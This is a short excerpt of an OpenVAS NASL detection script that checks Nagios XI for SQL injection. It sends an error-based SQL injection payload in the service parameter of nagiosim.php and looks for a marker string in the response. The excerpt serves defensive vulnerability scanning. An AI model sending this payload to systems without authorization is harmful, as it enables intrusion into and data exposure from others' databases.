...
# $Id: gb_nagios_xi_multiple_vulnerabilities_06_16.nasl 10881 2018-08-10 10:27:02Z mmartin $
#
...
url = dir + "/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a&service='+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(" +
            "'|',(SELECT+0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374),'|',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+OR+'";

if( http_vuln_check( port:port, url:url, pattern:'(OpenVAS-SQL-Injection-Test|relation "information_schema.character_sets" does not exist)' ) )
{
